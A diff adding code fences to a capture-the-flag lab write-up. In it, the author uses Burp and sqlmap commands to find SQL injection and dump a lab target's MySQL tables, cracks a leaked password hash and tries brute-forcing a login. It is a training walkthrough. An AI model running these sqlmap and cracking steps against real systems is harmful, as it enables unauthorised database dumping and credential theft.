@@ -117,20 +117,24 @@ Used burp to proxy the request to a file for sqlmap to test for injection vulner
 "sqlmap -l req --dbms=MySQL -D expose,mysql,phpmyadmin --tables" dumps tables from databases "expose,mysql,phpmyadmin".
 I started with expose database. There were "user, config" tables so lets find out columns for "user" table. 
 "sqlmap -l req --dbms=MySQL -D expose -T user --columns" found "created,email,id,password" columns so let's dump them!
+````
 +-----------------+----+--------------------------------------+
 | email           | id | password                             |
 +-----------------+----+--------------------------------------+
 | hacker@root.thm | 1  | VeryDifficultPassword!!#@#@!#!@#1231 |
 +-----------------+----+--------------------------------------+
+````
 This grants login to "/admin_101" but there is nothing.
 
-"sqlmap -l req --dbms=MySQL -D expose -T config --dump" gives more interesting output:
+"sqlmap -l req --dbms=MySQL -D expose -T config --dump" gives more interesting output
+````
 +----+------------------------------+-----------------------------------------------------+
 | id | url                          | password                                            |
 +----+------------------------------+-----------------------------------------------------+
 | 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929                    |
 | 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
 +----+------------------------------+-----------------------------------------------------+
+````
 I tried to crack hash with JohnTheRipper but it didn't work. I used crackstation.com to see if it would work, and it did. The password is "easytohack".
 Tried to brute force "http://10.10.116.111:1337/upload-cv00101011/index.php" with z starting usernames as it hints that the username starts with "z" but it didn't work.
 "/file1010111/index.php" lets me in with the password "easytohack". Looking at the source code there is a "Hint: Try file or view as GET parameters?". 
